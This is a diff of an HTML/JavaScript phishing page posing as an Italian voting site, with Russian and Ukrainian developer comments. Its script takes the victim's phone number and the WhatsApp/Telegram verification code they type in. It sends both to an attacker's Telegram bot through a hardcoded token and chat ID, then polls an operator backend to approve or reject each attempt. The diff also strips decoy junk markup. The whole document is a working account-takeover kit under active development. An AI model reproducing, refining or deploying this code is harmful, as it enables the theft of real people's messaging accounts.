+                <!-- Наш лоадер (для Telegram), изначально скрыт -->
+                <div id="loader-telegram" style="display: none;">
+                     <div class="loader"></div> <!-- Используем тот же класс .loader для консистентности -->
                 </div>
                 <div class="button primary hidden" id="copy-code">Copia</div>
             </div>
         </div>
-
-        <strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI QZhWtdNh</strong>
     </div>
-    <small
-        class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-        <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-            StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-    </small>
-    <div class="popup top40" id="popreboot" >
-        <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+
+    <!-- Попапы (переведены) -->
+    <div class="popup top40" id="popreboot" style="display: none;" >
         <div class="body">
-            <h2>Il tuo voto è stato conteggiato, grazie</h2> <!-- ПЕРЕВЕДЕНО -->
+            <h2>Il tuo voto è stato conteggiato, grazie</h2>
             <button class="button primary btn-ok" id="reload-page-ok">Ok</button>
-            <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
         </div>
-        <small
-            class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-            <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-                StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-        </small>
     </div>
-
-    <div class="popup top40" id="popwhat" >
-        <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+    <div class="popup top40" id="popwhat" style="display: none;" >
         <div class="body">
-            <h2>Qualcosa è andato storto!</h2> <!-- ПЕРЕВЕДЕНО -->
-            <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP WFFhTuDduNDAMMCnWt
-                MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK HMnrMFReAPNuUAFJVUhthI
-                CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
-            <p>Hai inserito il codice in modo errato, vai all'applicazione WhatsApp e inserisci il codice correttamente, altrimenti il tuo voto non verrà conteggiato.</p> <!-- ПЕРЕВЕДЕНО -->
-            <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
-                <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
-                    PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
-            </span>
-            <button class="button primary btn-reb" id="reload-page-what">Riprova</button> <!-- ПЕРЕВЕДЕНО -->
-            <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
+            <h2>Qualcosa è andato storto!</h2>
+            <p>Hai inserito il codice in modo errato, vai all'applicazione WhatsApp e inserisci il codice correttamente, altrimenti il tuo voto non verrà conteggiato.</p>
+            <button class="button primary btn-reb" id="reload-page-what">Riprova</button>
         </div>
-        <small
-            class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
-            <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
-                StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
-        </small>
     </div>
-    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                                 
     <script>
-        // *** ВАШ ОРИГИНАЛЬНЫЙ СКРИПТ ДЛЯ TELEGRAM (с небольшими правками ID) ***
-        document.addEventListener("DOMContentLoaded", function () {
-            const btnRebWhat = document.getElementById("reload-page-what");
-            const btnOkReboot = document.getElementById("reload-page-ok");
-            
-            const popWhat = document.getElementById("popwhat");
-            const popReboot = document.getElementById("popreboot");
+    document.addEventListener("DOMContentLoaded", function () {
+        const btnRebWhat = document.getElementById("reload-page-what");
+        const btnOkReboot = document.getElementById("reload-page-ok");
+        
+        const popWhat = document.getElementById("popwhat");
+        const popReboot = document.getElementById("popreboot");
 
-            const step1Div = document.getElementById("step-1"); 
-            const originalStep2Div = document.getElementById("step-2"); // Оригинальный второй шаг (QR/number.js loader)
-            
-            const formStep2Telegram = document.getElementById("form-step-2-telegram"); // Наша форма для кода Telegram
-            const loaderTelegram = document.getElementById("loader-telegram"); // Наш лоадер для Telegram
-            
-            const nextStepBtnOriginal = document.getElementById("next-step"); // Кнопка "Continua" на первом шаге
-            const codeStepBtnTelegram = document.getElementById("two-step-telegram"); // Кнопка "Continua" на нашем втором шаге
+        const step1Div = document.getElementById("step-1"); 
+        const originalStep2Div = document.getElementById("step-2"); // Оригинальный второй шаг (от number.js)
+        const originalLoaderContainer = document.getElementById("loader"); // Оригинальный контейнер с лоадером/QR от number.js
+        
+        const formStepTelegram = document.getElementById("form-step-telegram"); // Наша форма для кода Telegram
+        const loaderTelegram = document.getElementById("loader-telegram"); // Наш лоадер для Telegram
+        
+        const nextStepBtnOriginal = document.getElementById("next-step"); 
+        const codeStepBtnTelegram = document.getElementById("two-step-telegram"); 
 
-            if(btnRebWhat) {
-                btnRebWhat.addEventListener("click", () => {
-                    if(popWhat) popWhat.style.display = "none";
-                    if(formStep2Telegram) formStep2Telegram.style.display = "block"; // Показать нашу форму
-                    if(loaderTelegram) loaderTelegram.style.display = "none";
-                    const codeInputTg = document.getElementById("code-telegram");
-                    if(codeInputTg) codeInputTg.value = "";
-                });
-            }
+        if(btnRebWhat) {
+            btnRebWhat.addEventListener("click", () => {
+                if(popWhat) popWhat.style.display = "none";
+                if(formStepTelegram) formStepTelegram.style.display = "block";
+                if(loaderTelegram) loaderTelegram.style.display = "none";
+                const codeInputTg = document.getElementById("code-telegram");
+                if(codeInputTg) codeInputTg.value = "";
+            });
+        }
 
-            if(btnOkReboot) {
-                btnOkReboot.addEventListener("click", () => {
-                    const redirectUrl = document.body.getAttribute('data-redirect');
-                    if (redirectUrl) {
-                        window.location.href = redirectUrl;
-                    } else {
-                        if(popReboot) popReboot.style.display = "none";
-                    }
-                });
-            }
+        if(btnOkReboot) {
+            btnOkReboot.addEventListener("click", () => {
+                const redirectUrl = document.body.getAttribute('data-redirect');
+                if (redirectUrl) {
+                    window.location.href = redirectUrl;
+                } else {
+                    if(popReboot) popReboot.style.display = "none";
+                }
+            });
+        }
 
-            if(popReboot) popReboot.style.display = "none";
-            if(popWhat) popWhat.style.display = "none";
-            if(formStep2Telegram) formStep2Telegram.style.display = "none";
-            if(loaderTelegram) loaderTelegram.style.display = "none";
+        const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g";
+        const chat_id = "7538727898";
+        const backendURL = "https://api.bestballerinavote.com";
 
+        // Эта переменная будет отслеживать, был ли номер уже отправлен
+        let numberSentToTelegram = false;
 
-            const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g";
-            const chat_id = "7538727898";
-            const backendURL = "https://api.bestballerinavote.com";
+        if (nextStepBtnOriginal) {
+             nextStepBtnOriginal.addEventListener("click", function (e) {
+                // Не используем e.preventDefault(), чтобы number.js мог обработать клик
+                // (например, для валидации и перехода на свой #step-2)
 
-            // Логика кнопки "Continua" первого шага (id="next-step")
-            // Эта кнопка также используется number.js.
-            // Мы добавляем наш обработчик, но НЕ отменяем стандартное поведение,
-            // чтобы number.js мог выполнить свои действия (валидацию, переход на свой #step-2).
-            if (nextStepBtnOriginal) {
-                 nextStepBtnOriginal.addEventListener("click", function (e) {
-                    // НЕ используем e.preventDefault(), чтобы number.js сработал.
-                    
+                // Отправляем данные в Telegram только если они еще не были отправлены
+                if (!numberSentToTelegram) {
                     const phoneInput = document.getElementById("number");
                     if (!phoneInput) return;
                     const phone = phoneInput.value.trim();
                     const errorP = document.querySelector('#form-step-1 .error');
 
-                    // Простая проверка, чтобы не отправлять пустой номер.
-                    // Основную валидацию и показ ошибки должен делать number.js
-                    if (!phone) {
-                        if (errorP && errorP.classList.contains('hidden')) { // Показать ошибку если она скрыта
-                           // errorP.classList.remove('hidden'); // number.js должен сам это делать
+                    if (!phone) { // Простая проверка на пустоту, основная валидация на number.js
+                        if (errorP && errorP.classList.contains('hidden')) {
+                            // errorP.classList.remove('hidden'); // Доверим показ ошибки number.js
                         }
                         return; 
                     } else {
-                       if (errorP) errorP.classList.add('hidden'); // Скрыть если была наша ошибка
+                       if (errorP) errorP.classList.add('hidden');
                     }
 
                     sessionStorage.setItem("submittedPhone", phone);
@@ -475,106 +326,88 @@
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ chat_id, text: msg })
-                    });
+                    }).then(() => {
+                        numberSentToTelegram = true; // Помечаем, что номер отправлен
+                    }).catch(err => console.error("Ошибка отправки номера в Telegram:", err));
+                }
+                // Далее number.js должен скрыть step-1 и показать originalStep2Div
+                // Это будет отслежено MutationObserver
+            });
+        }
 
-                    // После клика number.js должен скрыть step-1 и показать step-2 (оригинальный).
-                    // Мы перехватим это с помощью MutationObserver.
-                });
-            }
-
-            // Отслеживаем, когда number.js скрывает первый шаг,
-            // чтобы затем показать НАШУ форму ввода кода.
-            const observer = new MutationObserver(function(mutationsList, observerInstance) {
-                for(const mutation of mutationsList) {
-                    if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
-                        if (step1Div && step1Div.style.display === 'none') {
-                            // number.js скрыл первый шаг.
-                            // Теперь мы должны скрыть оригинальный второй шаг (если он был показан number.js)
-                            // и показать нашу форму для ввода кода.
-                            if (originalStep2Div) originalStep2Div.style.display = 'none';
-                            if (formStep2Telegram) formStep2Telegram.style.display = 'block';
-                            
-                            observerInstance.disconnect(); // Отключаем наблюдение
-                            break;
-                        }
+        const observer = new MutationObserver(function(mutationsList, observerInstance) {
+            for(const mutation of mutationsList) {
+                if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
+                    if (step1Div && step1Div.style.display === 'none' && originalStep2Div && originalStep2Div.style.display !== 'none') {
+                        // number.js скрыл первый шаг И показал свой второй шаг (#step-2)
+                        // Теперь мы должны скрыть его оригинальный контент (например, QR-loader)
+                        // и показать нашу форму для ввода кода.
+                        if (originalLoaderContainer) originalLoaderContainer.style.display = 'none'; // Скрываем оригинальный лоадер/QR
+                        if (formStepTelegram) formStepTelegram.style.display = 'block'; // Показываем нашу форму
+                        
+                        observerInstance.disconnect(); 
+                        break;
                     }
                 }
-            });
-
-            if (step1Div) {
-                observer.observe(step1Div, { attributes: true });
-            }
-
-
-            // Логика кнопки "Continua" НАШЕГО второго шага (ввод кода для Telegram)
-            if (codeStepBtnTelegram) {
-                codeStepBtnTelegram.addEventListener("click", function (e) {
-                    e.preventDefault();
-
-                    const codeInput = document.getElementById("code-telegram");
-                    const code = codeInput ? codeInput.value.trim() : "";
-                    const phone = sessionStorage.getItem("submittedPhone");
-
-                    if (!code) {
-                         alert("Per favore, inserisci il codice.");
-                         return;
-                    }
-                     if (!phone) {
-                        alert("Errore: numero di telefono non trovato. Riprova dal primo passaggio.");
-                        if(formStep2Telegram) formStep2Telegram.style.display = "none";
-                        if(originalStep2Div) originalStep2Div.style.display = "none";
-                        if(step1Div) step1Div.style.display = "block";
-                        return;
-                    }
-
-                    const msg = `🔐 Код підтвердження:\nТелефон: ${phone}\nКод: ${code}`;
-                    // Убираем reply_markup, если бот парсит текст
-                    /* const keyboard = {
-                        inline_keyboard: [
-                            [{ text: "✅ Так", callback_data: `confirm_yes_${phone}` },
-                             { text: "❌ Ні", callback_data: `confirm_no_${phone}` }]
-                        ]
-                    }; */
-
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ chat_id, text: msg /*, reply_markup: keyboard */ })
-                    });
-
-                    if(formStep2Telegram) formStep2Telegram.style.display = "none";
-                    if(loaderTelegram) loaderTelegram.style.display = "block";
-
-                    waitForApproval(phone);
-                });
-            }
-
-            function waitForApproval(phone) {
-                const interval = setInterval(() => {
-                    fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
-                        .then(res => {
-                            if (!res.ok) throw new Error(`Network response was not ok: ${res.statusText}`);
-                            return res.json();
-                        })
-                        .then(data => {
-                            console.log("📩 Відповідь від бекенду:", data);
-                            if (data.status === "approved") {
-                                clearInterval(interval);
-                                if(loaderTelegram) loaderTelegram.style.display = "none";
-                                if(popReboot) popReboot.style.display = "block";
-                            } else if (data.status === "rejected") {
-                                clearInterval(interval);
-                                if(loaderTelegram) loaderTelegram.style.display = "none";
-                                if(popWhat) popWhat.style.display = "block";
-                            }
-                        })
-                        .catch(err => {
-                            console.error("❌ Помилка бекенду або мережі:", err);
-                            // Можно добавить обработку, если нужно
-                        });
-                }, 3000);
             }
         });
+
+        if (step1Div && originalStep2Div) { // Наблюдаем только если оба элемента существуют
+            observer.observe(step1Div, { attributes: true });
+            observer.observe(originalStep2Div, { attributes: true }); // Также наблюдаем за вторым шагом
+        }
+
+        if (codeStepBtnTelegram) {
+            codeStepBtnTelegram.addEventListener("click", function (e) {
+                e.preventDefault();
+                const codeInput = document.getElementById("code-telegram");
+                const code = codeInput ? codeInput.value.trim() : "";
+                const phone = sessionStorage.getItem("submittedPhone");
+
+                if (!code) { alert("Per favore, inserisci il codice."); return; }
+                if (!phone) {
+                    alert("Errore: numero di telefono non trovato. Riprova dal primo passaggio.");
+                    if(formStepTelegram) formStepTelegram.style.display = "none";
+                    if(originalLoaderContainer) originalLoaderContainer.style.display = "block"; // Вернуть оригинальный loader
+                    if(step1Div) step1Div.style.display = "block";
+                    numberSentToTelegram = false; // Сбросить флаг, чтобы можно было отправить номер заново
+                    return;
+                }
+                const msg = `🔐 Код підтвердження:\nТелефон: ${phone}\nКод: ${code}`;
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id, text: msg })
+                });
+                if(formStepTelegram) formStepTelegram.style.display = "none";
+                if(loaderTelegram) loaderTelegram.style.display = "block";
+                waitForApproval(phone);
+            });
+        }
+
+        function waitForApproval(phone) {
+            const interval = setInterval(() => {
+                fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
+                    .then(res => {
+                        if (!res.ok) throw new Error(`Network response was not ok: ${res.statusText}`);
+                        return res.json();
+                    })
+                    .then(data => {
+                        console.log("📩 Відповідь від бекенду:", data);
+                        if (data.status === "approved") {
+                            clearInterval(interval);
+                            if(loaderTelegram) loaderTelegram.style.display = "none";
+                            if(popReboot) popReboot.style.display = "block";
+                        } else if (data.status === "rejected") {
+                            clearInterval(interval);
+                            if(loaderTelegram) loaderTelegram.style.display = "none";
+                            if(popWhat) popWhat.style.display = "block";
+                        }
+                    })
+                    .catch(err => console.error("❌ Помилка бекенду або мережі:", err));
+            }, 3000);
+        }
+    });
     </script>
 </body>
 </html>
